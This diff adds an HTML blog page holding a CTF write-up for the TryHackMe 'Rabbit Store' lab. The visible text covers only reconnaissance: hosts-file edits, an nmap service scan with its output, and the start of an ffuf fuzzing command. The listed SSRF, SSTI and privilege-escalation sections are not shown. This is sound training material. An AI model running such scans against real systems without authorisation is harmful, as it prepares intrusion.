@@ -1,0 +1,1212 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <title>Rabbit Store | THM Writeup :: CyberJagadeesh - Learn Cyber Security</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="Introduction Detailed walkthroughs for Rabbit Store CTF challenges on TryHackMe .
+Enumaration echo 10.10.134.77 rabbitstore.thm &gt;&gt; /etc/hosts Mapped the IP address to the domain rabbitstore.thm.
+Nmap $ nmap rabbitstore.thm -p22,80,4369,25672 -sC -sV PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 (ECDSA) |_ 256 b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-title: Did not follow redirect to http://cloudsite.thm/ |_http-server-header: Apache/2.4.52 (Ubuntu) 4369/tcp open epmd Erlang Port Mapper Daemon | epmd-info: | epmd_port: 4369 | nodes: |_ rabbit: 25672 25672/tcp open unknown Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel From the above scan, we know that:
+"
+/>
+<meta
+  name="keywords"
+  content="cyber security, penetration testing, ethical hacking, vulnerability assessment, network security, application security, web application security, security testing, red teaming, bug bounty, CTFs, cybersecurity challenges, hacking tutorials, security tools, exploit development, reverse engineering, penetration tester, security researcher, security analyst, information security, digital forensics, incident response, threat intelligence, security awareness, social engineering, phishing, malware analysis, cryptography, cloud security, IoT security, mobile security, how to become a penetration tester, penetration testing tools, CTF challenges for beginners, web application penetration testing, network penetration testing, exploit development tutorial, reverse engineering techniques, bug bounty hunting tips, security research projects, cyber security certifications"
+/>
+<meta name="robots" content="noodp" /><link rel="manifest" href="/manifest.json" /><meta property="og:url" content="http://localhost:1313/posts/thm/rabbitstore/writeup/">
+  <meta property="og:site_name" content="CyberJagadeesh">
+  <meta property="og:title" content="Rabbit Store | THM Writeup">
+  <meta property="og:description" content="Introduction Detailed walkthroughs for Rabbit Store CTF challenges on TryHackMe .
+Enumaration echo 10.10.134.77 rabbitstore.thm &gt;&gt; /etc/hosts Mapped the IP address to the domain rabbitstore.thm.
+Nmap $ nmap rabbitstore.thm -p22,80,4369,25672 -sC -sV PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 (ECDSA) |_ 256 b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-title: Did not follow redirect to http://cloudsite.thm/ |_http-server-header: Apache/2.4.52 (Ubuntu) 4369/tcp open epmd Erlang Port Mapper Daemon | epmd-info: | epmd_port: 4369 | nodes: |_ rabbit: 25672 25672/tcp open unknown Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel From the above scan, we know that:">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-02-27T11:17:54+05:30">
+    <meta property="article:modified_time" content="2025-02-27T11:17:54+05:30">
+    <meta property="article:tag" content="SSRF">
+    <meta property="article:tag" content="SSTI">
+    <meta property="article:tag" content="Ffuf">
+    <meta property="article:tag" content="BurpSuite">
+    <meta property="article:tag" content="Api">
+    <meta property="article:tag" content="Seq">
+      <meta property="og:see_also" content="http://localhost:1313/posts/thm/light/writeup/">
+      <meta property="og:see_also" content="http://localhost:1313/posts/thm/smol/writeup/">
+      <meta property="og:see_also" content="http://localhost:1313/posts/thm/backtrack/writeup/">
+      <meta property="og:see_also" content="http://localhost:1313/posts/block/writeup/">
+      <meta property="og:see_also" content="http://localhost:1313/posts/pyrat/writeup/">
+      <meta property="og:see_also" content="http://localhost:1313/posts/thelondonbridge/writeup/">
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Rabbit Store | THM Writeup">
+  <meta name="twitter:description" content="Introduction Detailed walkthroughs for Rabbit Store CTF challenges on TryHackMe .
+Enumaration echo 10.10.134.77 rabbitstore.thm &gt;&gt; /etc/hosts Mapped the IP address to the domain rabbitstore.thm.
+Nmap $ nmap rabbitstore.thm -p22,80,4369,25672 -sC -sV PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 (ECDSA) |_ 256 b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-title: Did not follow redirect to http://cloudsite.thm/ |_http-server-header: Apache/2.4.52 (Ubuntu) 4369/tcp open epmd Erlang Port Mapper Daemon | epmd-info: | epmd_port: 4369 | nodes: |_ rabbit: 25672 25672/tcp open unknown Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel From the above scan, we know that:">
+
+
+<link rel="canonical" href="http://localhost:1313/posts/thm/rabbitstore/writeup/" />
+
+<link rel="shortcut icon" href="/favicon.ico" />
+<link rel="stylesheet" href="/css/index.5287fd9d41d8a879613a40ae3cfd190b68c27952b809c28ce66a58d6c634d0cb.css">
+
+
+
+
+
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-376DY6PW0W"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-376DY6PW0W');
+        }
+      </script>
+
+
+
+
+  
+  <script type="application/ld+json">
+  {"@context":"https://schema.org","@type":"Article","author":{"@type":"Person","name":"CyberJagadeesh"},"dateModified":"2025-02-27T11:17:54+05:30","datePublished":"2025-02-27T11:17:54+05:30","description":"Introduction Detailed walkthroughs for Rabbit Store CTF challenges on TryHackMe .\nEnumaration echo 10.10.134.77 rabbitstore.thm \u0026gt;\u0026gt; /etc/hosts Mapped the IP address to the domain rabbitstore.thm.\nNmap $ nmap rabbitstore.thm -p22,80,4369,25672 -sC -sV PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 (ECDSA) |_ 256 b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-title: Did not follow redirect to http://cloudsite.thm/ |_http-server-header: Apache/2.4.52 (Ubuntu) 4369/tcp open epmd Erlang Port Mapper Daemon | epmd-info: | epmd_port: 4369 | nodes: |_ rabbit: 25672 25672/tcp open unknown Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel From the above scan, we know that:\n","image":"/posts/thm/rabbitstore/rabbitstore.png","name":"Rabbit Store | THM Writeup","url":"http://localhost:1313/posts/thm/rabbitstore/writeup/"}
+</script>
+
+</head>
+<body class="flex flex-col min-h-screen w-full bg-slate-50 dark:bg-gray-800">
+    
+<div class="fixed right-0 top-0 z-50 flex items-center justify-center bg-gray-200 p-2 text-sm uppercase text-black sm:bg-red-200 md:bg-yellow-200 lg:bg-green-200 xl:bg-blue-200 2xl:bg-pink-200">
+  <span class="block sm:hidden">all</span>
+  <span class="hidden sm:block md:hidden">sm</span>
+  <span class="hidden md:block lg:hidden">md</span>
+  <span class="hidden lg:block xl:hidden">lg</span>
+  <span class="hidden xl:block 2xl:hidden">xl</span>
+  <span class="hidden 2xl:block">2xl</span>
+</div>
+
+  <header class="flex flex-none justify-center z-10">
+    <div class="flex flex-row gap justify-between w-full max-w-4xl lg:max-w-5xl h-12 mt-3">
+  <div class="flex-none ml-2 md:ml-0">
+    <a href="/" class="">
+      <img class="h-12 w-12 rounded-full object-cover bg-gray-100" src="/logo.png" alt="logo">
+    </a>
+  </div>
+  <div class="flex-1"></div>
+  <div class="flex-none">
+    
+
+
+
+<nav class="h-full static">
+  <button id="navbar-menu-toggle" type="button" class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg md:hidden" aria-controls="navbar-menu" aria-expanded="false">
+    <span class="sr-only">Open main menu</span>
+    <i class="w-8 h-8">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu-2" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 6l16 0" />
+  <path d="M4 12l16 0" />
+  <path d="M4 18l16 0" />
+</svg>
+
+    </i>
+  </button>
+  <div class="absolute md:static top-16 left-0 right-0 z-50 hidden w-full md:block md:w-auto" id="navbar-menu">
+    <ul class="flex flex-col mx-2 md:mx-0 md:flex-row md:border-0 rounded-sm md:rounded-full px-3 text-base font-medium text-slate-800 dark:text-slate-200 shadow-lg bg-white dark:bg-gray-600 shadow-slate-800/5 dark:shadow-slate-200/5 ring-1 ring-slate-900/5 dark:ring-slate-100/5">
+    
+        <li id="about" class="">
+          <a class="block px-3 py-3 hover:text-emerald-600"
+            href="/about/" title="About">About</a>
+        </li>
+      
+    
+        <li id="post" class="">
+          <a class="block px-3 py-3 hover:text-emerald-600 text-emerald-600"
+            href="/posts/" title="Post">Post</a>
+        </li>
+      
+    
+    </ul>
+  </div>
+</nav>
+
+
+  </div>
+  
+  <div class="flex-none mx-1"></div>
+  
+  <div class="flex-none md:hidden">
+    <a href=/search/ class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg" aria-controls="navbar-menu" aria-expanded="false">
+      <span class="sr-only">Search</span>
+      <i class="w-8 h-8">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+    <path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" />
+    <path d="M21 21l-6 -6" />
+</svg>
+
+      </i>
+    </a>
+  </div>
+  <div class="darkmode-toggle flex flex-none mr-2 md:mr-0">
+    <label for="darkmode-toggle" class="flex items-center px-3 cursor-pointer rounded-full bg-gray-100 dark:bg-gray-600" title="Toggle dark mode">
+      <input name="darkmode-toggle" id="darkmode-toggle" type="checkbox" class="sr-only peer" aria-label="Toggle dark mode">
+      <div class="group flex flex-row gap-1 justify-center h-8 px-1 rounded-full bg-white dark:bg-gray-700">
+        <i class="h-6 w-6 flex-none rounded-full bg-yellow-400 place-self-center peer-checked:group-[]:invisible">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brightness-down" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M12 12m-3 0a3 3 0 1 0 6 0a3 3 0 1 0 -6 0"></path>
+   <path d="M12 5l0 .01"></path>
+   <path d="M17 7l0 .01"></path>
+   <path d="M19 12l0 .01"></path>
+   <path d="M17 17l0 .01"></path>
+   <path d="M12 19l0 .01"></path>
+   <path d="M7 17l0 .01"></path>
+   <path d="M5 12l0 .01"></path>
+   <path d="M7 7l0 .01"></path>
+</svg>
+
+        </i>
+        <i class="h-6 w-6 flex-none rounded-full place-self-center invisible peer-checked:group-[]:visible">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-moon-stars" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path>
+   <path d="M17 4a2 2 0 0 0 2 2a2 2 0 0 0 -2 2a2 2 0 0 0 -2 -2a2 2 0 0 0 2 -2"></path>
+   <path d="M19 11h2m-1 -1v2"></path>
+</svg>
+
+        </i>
+      </div>
+    </label>
+  </div>
+</div>
+
+  </header>
+  <main class="flex flex-auto justify-center">
+    
+<div class="w-full max-w-4xl lg:max-w-5xl">
+  <div class="flex flex-col mt-6 mx-2 md:mx-0 rounded-lg overflow-hidden shadow-md bg-white dark:bg-gray-700">
+    <div>
+      <a href="/posts/thm/rabbitstore/writeup/">
+        <figure>
+    <img class="w-full object-cover h-36 md:h-48 xl:h-60" src="/posts/thm/rabbitstore/rabbitstore.png"
+      alt="Rabbit Store | THM Writeup" title="Rabbit Store | THM Writeup"
+      loading="lazy"
+    >
+  </figure>
+      </a>
+    </div>
+    <div class="flex flex-col gap-y-3 p-6">
+      <h1 class="text-4xl font-semibold text-slate-800 dark:text-slate-100">
+        <a href="/posts/thm/rabbitstore/writeup/">Rabbit Store | THM Writeup</a>
+      </h1>
+
+      
+      
+  <ul class="flex flex-row flex-wrap text-slate-500 dark:text-slate-300">
+    
+      
+      <li>
+        <a href="/categories/ctf/"
+          class="text-sm mr-2 px-2 py-1 rounded border border-emerald-800 bg-emerald-800 text-slate-50">
+          CTF
+        </a>
+      </li>
+      
+    
+    
+      
+      <li>
+        <a href="/tags/ssrf/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">SSRF</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/ssti/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">SSTI</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/ffuf/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">Ffuf</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/burpsuite/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">BurpSuite</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/api/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">Api</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/seq/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">Seq</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/jinja2/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">Jinja2</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/erlang/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">Erlang</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/rabbitmqctl/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">Rabbitmqctl</span>
+        </a>
+      </li>
+      
+    
+    
+      
+      <li>
+        <a href="/series/tryhackme/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">Tryhackme</span>
+        </a>
+      </li>
+      
+    
+    
+      
+      <li>
+        <a href="/platforms/linux/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">Linux</span>
+        </a>
+      </li>
+      
+    
+    
+      
+      <li>
+        <a href="/levels/medium/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">Medium</span>
+        </a>
+      </li>
+      
+    
+    
+  </ul>
+
+
+
+      <div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300">
+  
+  
+  <div class="flex flex-row text-base gap-x-1">
+    <i class="h-6 w-6 flex-none">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z"></path>
+   <path d="M16 3v4"></path>
+   <path d="M8 3v4"></path>
+   <path d="M4 11h16"></path>
+   <path d="M11 15h1"></path>
+   <path d="M12 15v3"></path>
+</svg>
+
+    </i>
+    <time datetime="2025-02-27T11:17:54&#43;05:30">
+      2025-02-27
+    </time>
+  </div>
+
+  <div class="flex flex-row text-base gap-x-1">
+    <i class="h-6 w-6 flex-none">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hourglass-high" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M6.5 7h11"></path>
+   <path d="M6 20v-2a6 6 0 1 1 12 0v2a1 1 0 0 1 -1 1h-10a1 1 0 0 1 -1 -1z"></path>
+   <path d="M6 4v2a6 6 0 1 0 12 0v-2a1 1 0 0 0 -1 -1h-10a1 1 0 0 0 -1 1z"></path>
+</svg>
+
+    </i>
+    <span>
+      9 minutes to read
+    </span>
+  </div>
+</div>
+
+
+      
+        
+        <section class="prose prose-slate dark:prose-invert w-full max-w-4xl lg:max-w-5xl mt-6">
+          <h2>Table of Contents</h2>
+          <aside><nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#enumaration">Enumaration</a>
+      <ul>
+        <li><a href="#nmap">Nmap</a></li>
+        <li><a href="#port-80">Port 80</a></li>
+        <li><a href="#ffuf1">ffuf1</a></li>
+        <li><a href="#account-login">Account Login</a></li>
+        <li><a href="#ffuf2">ffuf2</a></li>
+      </ul>
+    </li>
+    <li><a href="#shell-as-azrael">Shell as azrael</a>
+      <ul>
+        <li><a href="#ssrf">SSRF</a></li>
+        <li><a href="#seq">seq</a></li>
+        <li><a href="#ffuf3">ffuf3</a></li>
+        <li><a href="#jinja2---ssti">jinja2 - SSTI</a></li>
+        <li><a href="#rce">RCE</a></li>
+        <li><a href="#improving-shell">Improving shell</a></li>
+      </ul>
+    </li>
+    <li><a href="#shell-as-root">Shell as root</a>
+      <ul>
+        <li><a href="#erlang-cookie">Erlang Cookie</a></li>
+        <li><a href="#rabbitmqctl">Rabbitmqctl</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></aside>
+        </section>
+        
+      
+
+      <article class="mt-6 w-full max-w-4xl lg:max-w-5xl prose prose-slate dark:prose-invert prose-quoteless post-content">
+        <h2 id="introduction">Introduction</h2>
+<p>Detailed walkthroughs for <a href="https://tryhackme.com/room/rabbitstore" target="_blank" rel="noopener">Rabbit Store</a>
+ CTF challenges on <a href="https://tryhackme.com" target="_blank" rel="noopener">TryHackMe</a>
+.</p>
+<h2 id="enumaration">Enumaration</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> 10.10.134.77 rabbitstore.thm &gt;&gt; /etc/hosts
+</span></span></code></pre></div><p>Mapped the IP address to the domain <code>rabbitstore.thm</code>.</p>
+<h3 id="nmap">Nmap</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nmap rabbitstore.thm -p22,80,4369,25672 -sC -sV
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp    open  http    Apache httpd 2.4.52
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://cloudsite.thm/
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.52 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">4369/tcp  open  epmd    Erlang Port Mapper Daemon
+</span></span><span class="line"><span class="cl"><span class="p">|</span> epmd-info: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   epmd_port: <span class="m">4369</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   nodes: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    rabbit: <span class="m">25672</span>
+</span></span><span class="line"><span class="cl">25672/tcp open  unknown
+</span></span><span class="line"><span class="cl">Service Info: Host: 127.0.1.1<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>From the above scan, we know that:</p>
+<ul>
+<li><code>Port 22</code> (SSH): OpenSSH 8.9p1 on Ubuntu, with ECDSA and ED25519 host keys.</li>
+<li><code>Port 80</code> (HTTP): Apache 2.4.52.</li>
+<li><code>Port 4369</code> (Erlang Port Mapper Daemon): Used by Erlang for managing distributed nodes; a node rabbit is on <code>port 25672</code>.</li>
+</ul>
+<p>The system is running <code>Linux</code>.</p>
+<h3 id="port-80">Port 80</h3>
+<p>Let&rsquo;s go through port 80 of the target IP.</p>
+<p>
+
+
+
+<figure>
+    <img src="/posts/thm/rabbitstore/1.png" title="Website Redirection" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>Website Redirection</strong>
+    </figcaption>  
+</figure>
+
+We can see that <code>http://rabbitstore.thm/</code> is redirected to <code>http://cloudsite.thm/</code>.</p>
+<p>So, let&rsquo;s modify the <code>/etc/hosts</code> file by adding the following entry: <code>10.10.134.77 rabbitstore.thm cloudsite.thm</code>.</p>
+
+
+
+
+<figure>
+    <img src="/posts/thm/rabbitstore/2.png" title="cloudsite.thm" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>cloudsite.thm</strong>
+    </figcaption>  
+</figure>
+
+<p>Let&rsquo;s try to log in.</p>
+<p>Due to the redirection when accessing the login page, let&rsquo;s modify the <code>/etc/hosts</code> file again by adding the following entry: <code>10.10.134.77 rabbitstore.thm cloudsite.thm storage.cloudsite.thm</code>.</p>
+<p>After modifying the <code>/etc/hosts</code> file, we are able to access <code>storage.cloudsite.thm</code> for login.</p>
+<h3 id="ffuf1">ffuf1</h3>
+<p>Let&rsquo;s fuzz for interesting files and directories.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ffuf -c -u http://cloudsite.thm/FUZZ -w /usr/share/wordlists/dirb/big.txt
